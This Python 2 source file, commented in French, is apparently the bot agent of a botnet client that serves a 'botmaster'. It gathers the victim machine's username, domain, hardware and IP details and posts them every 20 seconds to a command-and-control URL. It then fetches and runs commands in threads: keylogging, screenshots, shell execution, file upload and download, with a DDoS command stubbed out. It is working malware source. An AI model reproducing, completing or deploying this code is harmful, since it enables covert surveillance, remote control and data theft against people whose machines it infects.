# -*- coding: utf-8 -*-
"""
Created on Mon Apr 26 02:07:43 2016

@author: abdelmajid
"""

__doc__="""
ce module pour l'agent, la machine.
"""

import requests
import time
import os
import threading

from outils.constants import Server, User, System, Chemins
from outils.files_communication import load_json, save_json
from commande import *

class Agent(threading.Thread):
    """
    Cette classe concernant le bot (cet machine).
    contient tous les commandes de cet machine à executer pour le botmaster.
    ....
    après on lance a chaque commande un Thread pour la executer.
    """
    # Atrribut de classe , False si la connexion (internet) active, False sinon
    #Utilisé par l'execution des commandes pour envoyer des trucs au serveur.
    CONNEXION=None #

    def __init__(self):
        """
        Classe représente le model "Client" du base de données.
        """
        threading.Thread.__init__(self)
        self.LOCK=threading.Lock()#pour la sychnronisation des hreads si on veut.
        self.clavierMouse=EcouteClavierSouris()


        self.id_client=None
        self.continent=None
        self.pays=None
        self.ville=None # après, si on trouvera une solution, pour la connais on l'utilise. (RAM , Execuse me :/ )
        self.ipadresse={u"locale":None,u"recu":None,u"inter":None}
        self.hostname=None
        self.dateajout=None
        # connectee: si devenir True, on commence d'envoyer les infos au serveur, on peut lancer un thread pour
        # verfier la connexion, qu'on elle marche en modifier cet attribut au True.
        # utilisé par Keylogger et ScreenShot pour enregistrer dans les fichiers ou bien envoyer au serveur.
        self.connecte=False
        self.actif=None
        self.vue=None
        #infos concernant la mach
        #COMPUTERNAME = models.Ch
        self.USERDOMAIN = None
        self.USERNAME = None
        self.PROCESSOR_IDENTIFIER = None
        self.PROCESSOR_REVISION = None
        self.PROCESSOR_ARCHITECTURE = None
        self.NUMBER_OF_PROCESSORS = None
        self.processor_level = None
        self.system= None
        self.src=os.getcwd()

        self.commandes={} # dictionnaire des Commandes à executer, {'id_cmd':Commande}

        #-----
        self.thread=None#threading.Thread(target=self.appel_gerer_agent())


    #------------------------
    def recuperer_agent_constants (self):
        """
        Remplir les infos d'un agnet depuis le module constants.
        (appel au debut du connection).
        """
        agent=Agent()
        agent.id_client=None
        agent.continent=User.BOT_CONTENENT
        agent.pays=User.BOT_PAYS
        agent.ville=None # après, si on trouvera une solution, pour la connais on l'utilise. (RAM , Execuse me :/ )
        agent.ipadresse={u"locale":User.IP_LOCAL,u"recu":None,u"inter":User.IP_INTER}
        agent.hostname=User.host_name
        agent.dateajout=None
        # connectee: si devenir True, on commence d'envoyer les infos au serveur, on peut lancer un thread pour
        # verfier la connexion, qu'on elle marche en modifier cet attribut au True.
        # utilisé par Keylogger et ScreenShot pour enregistrer dans les fichiers ou bien envoyer au serveur.
        agent.connecte=None
        agent.actif=None
        agent.vue=None
        #infos concernant la mach
        #COMPUTERNAME = models.Ch
        agent.USERDOMAIN = System.USERDOMAIN
        agent.USERNAME = System.USERNAME
        agent.PROCESSOR_IDENTIFIER = System.PROCESSOR_IDENTIFIER
        agent.PROCESSOR_REVISION = System.PROCESSOR_REVISION
        agent.PROCESSOR_ARCHITECTURE = System.PROCESSOR_ARCHITECTURE
        agent.NUMBER_OF_PROCESSORS = System.NUMBER_OF_PROCESSORS
        agent.processor_level = System.PROCESSOR_LEVEL
        agent.system= System.SYSTEM
        return agent

    #-----------------------
    def to_dict(self):
        """
        return l'agent sous forme d'un dictionnaire.
        """
        donnes={}
        donnes['id_client']=self.id_client
        donnes['continent']=self.continent
        donnes['pays']=self.pays
        donnes['ville']=self.ville
        donnes['ipadresse']=self.ipadresse
        donnes['iploc']=self.ipadresse['locale']
        donnes['ipinter']=self.ipadresse['inter']
        donnes['iprecu']=self.ipadresse['recu']
        donnes['hostname']=self.hostname
        donnes['dateajout']=self.dateajout
        donnes['connecte']=self.connecte
        donnes['actif']=self.actif
        donnes['vue']=self.vue
        donnes['USERDOMAIN']=self.USERDOMAIN
        donnes['USERNAME']=self.USERNAME
        donnes['PROCESSOR_IDENTIFIER']=self.PROCESSOR_IDENTIFIER
        donnes['PROCESSOR_REVISION']=self.PROCESSOR_REVISION
        donnes['PROCESSOR_ARCHITECTURE']=self.PROCESSOR_ARCHITECTURE
        donnes['NUMBER_OF_PROCESSORS']=self.NUMBER_OF_PROCESSORS
        donnes['processor_level']=self.processor_level
        donnes['system']=self.system
        donnes['src']=self.src

        return donnes

    #------------------------
    def recuperer_id_file(self):
        """
        Cette méthode recupere l'id de client, depuis le fichier infos,
        si l'id existe, on commence notre travaile,
        sinon on l'enregistre dans le serveur, et on recupere son id pour l'enregistrer
        dans le fichier infos. et on continue le travail.
        """
        infos=load_json(Chemins.CHEMIN_INFOS_FILE)
        if infos is not None:
            try:
                self.id_client=infos["id_client"]
                return self.id_client
            except:
                return None # penser a eregistrer ce agent dans le serveur.

    #----------------------
    def enregistrer_id_file(self):
        """
        Enregistrer l'id dans le fichier.
        """
        infos=save_json(Chemins.CHEMIN_INFOS_FILE,{"id_client":self.id_client})

    #---------------------
    def recuperer_commandes_file(self):
        """
        Methode pour recuperer les commandes de cet agent, qui sont enregistrées
        dans le fichier correspondant.
        """
        print "Recuperer les commande du fichier"
        cmds=load_json(Chemins.CHEMIN_CMDS_FILE)
        if cmds is not None:
            for id_cmd,donnes in cmds.items():
                type_cmd=""
                try:
                    type_cmd=donnes["type_cmd"]
                except:
                    continue

                if type_cmd == "KeyLogger":
                    cmd_k=CommandeKeyLogger()# cmd avec des attributs None
                    cmd_k.dict_to_commande(int(id_cmd),donnes)
                    self.commande_arrive(int(id_cmd),cmd_k)

                if type_cmd == "ScreenShot":
                    cmd_s=CommandeScreenShot()# cmd avec des attributs None
                    cmd_s.dict_to_commande(int(id_cmd),donnes)
                    self.commande_arrive(int(id_cmd),cmd_s)

                if type_cmd == "Shell":
                    cmd_sh=CommandeShell()# cmd avec des attributs None
                    cmd_sh.dict_to_commande(int(id_cmd),donnes)
                    self.commande_arrive(int(id_cmd),cmd_sh)

                if type_cmd == "Upload":
                    cmd_sh=CommandeUpload()# cmd avec des attributs None
                    cmd_sh.dict_to_commande(int(id_cmd),donnes)
                    self.commande_arrive(int(id_cmd),cmd_sh)

                if type_cmd == "Download":
                    cmd_sh=CommandeDownload()# cmd avec des attributs None
                    cmd_sh.dict_to_commande(int(id_cmd),donnes)
                    self.commande_arrive(int(id_cmd),cmd_sh)

                #if type_cmd =="DDOS":
                    #....


    #---------------------
    def commande_arrive(self, id_c,cmd):
        """
        Gérer l'arrivée d'une commande
        """
        if id_c in self.commandes.keys():
            self.commandes[id_c].modifier_attrs(cmd)
        else:
            self.commandes[id_c]=cmd
        cmd=self.commandes[id_c]
        #si le temps de départ est vennu et le thread n'est pas encore lancé.
        if not cmd.thread_active and cmd.is_time_to_work():
            #print "teste de start vraie %d :"%id_c,cmd.thread_active,cmd.is_time_to_work()
            cmd.thread_active=True
            cmd.start()

    #---------------------
    #def appel_gerer_agent(self):
    def run(self):
        """
        appel l'url gereragent. Recuperer des infos comme id_client, client acif/non.
        et toutes les commandes a executer. On va alors vider le fichier des commandes, et le
        remplir par cette commandes, si une commande "agent.commandes" est pas dans la liste
        recupérée, donc on la s'arrete.
        """
        print "Appel de gere agent"

        while True:
            with self.LOCK:# on bloque tous les threads pour que un thread execute cette section (critique).
                donnees=self.to_dict()
                r=None
                try:
                    r=requests.post(Server.URL_GERERAGENT,data=donnees)
                    r.encoding="utf-8"
                except:
                    r=None

                if r is not None and r.ok:
                    #print "content\n",r.content
                    Agent.CONNEXION=True

                    def verifier_val(val):
                        if len(val)>0 and val!='None':
                            return val
                        return None

                    infos=r.content.decode('utf8').split("{/INFOS/}")[1]
                    cmds=r.content.decode('utf8').split("{/COMMANDES/}")[1]
                    #print "-------infos"
                    infos=[attr for attr in infos.split("{/ATTRIBUT/}") if len(attr)>3]
                    for info in infos:
                        key,val=info.split(":")[0],":".join(info.split(":")[1:])
                        #print key,val
                        if key=="id_client":
                            id_cl=int(val)
                            if self.id_client != id_cl:
                                self.id_client=id_cl
                                self.enregistrer_id_file()

                        if key=="actif":
                            self.actif=True if val=="True" else False
                        if key=="connecte":
                            self.connecte=True if val=="True" else False
                    #print "id:",self.id_client,", conne:",self.connecte,",actif:",self.actif

                    #print "------cmds"
                    #print cmds
                    cmds=[cmd for cmd in cmds.split("{/COMMANDE/}") if cmd.startswith("id_cmd")]
                    obj_cmd=Commande()
                    id_c_arrives=[]
                    for cmd in cmds:
                        cmd_a=obj_cmd.text_to_commande(cmd)
                        self.commande_arrive(int(cmd_a.id_cmd),cmd_a)
                        id_c_arrives.append(int(cmd_a.id_cmd))

                    #-----supp des commandes ----
                    id_c_supps=set(self.commandes.keys())-set(id_c_arrives)
                    for id_cmd_ar in id_c_supps:
                        commande_supp=self.commandes[id_cmd_ar]
                        commande_supp.arreter(False)# arreter seulement l'execution.
                        del self.commandes[id_cmd_ar]

                    #--------mise à jours fichiers cmds ----
                    self.sauvegrader_commandes_in_file() #enregistrer les commandes dans le fichiers.

                    #with open("C:\cont.txt","w") as f:
                        #f.write(r.content) # pas de problème avec les acaractères unicodes.
                elif r is not None:
                    #Erreur dans le serveur ou l'url.
                    Agent.CONNEXION=True
                    print "Erreur (Not found ou une autre erreur)"
                    self.recuperer_commandes_file() #executer les commandes du fichiers
                    #print r.content

                else:
                    # Pas de connection
                    Agent.CONNEXION=False
                    self.recuperer_commandes_file() #executer les commandes du fichiers(si inactif donc le ficher est vide)
                    print "Erreur de connexion / pas de connexion"
                    print u"Fin Execution par Testeur AMHx16 (teste sera elminier après)" #-Testeur-
                    self.actif=False # pour arreter les autres threads -Testeur-
                    exit()#erreter le thread (Testeur)#sera eliminé

                #-----Recommunication après 20 secondes ---- pour mis à jours
                print "**********====*********"
                print "CONNEXION:",Agent.CONNEXION
                #print "_____infos_____"
                #print self.to_dict()
                print "_____commandes____"
                for id_,cmd_ in self.commandes.items():
                    print "***id=",id_,"****"
                    print cmd_.commande_to_dict()
            #-----------------------
            time.sleep(20) #hors section critique, donnez la main aux autres trheads.

    #---------------------
    def sauvegrader_commandes_in_file(self):
        """
        Sauvegarder toutes commandes dans le fichiers cmds.
        """
        cmds={}
        for id_cm,cmd in self.commandes.items():
             cmds[id_cm]=cmd.commande_to_dict()
        save_json(Chemins.CHEMIN_CMDS_FILE,cmds)
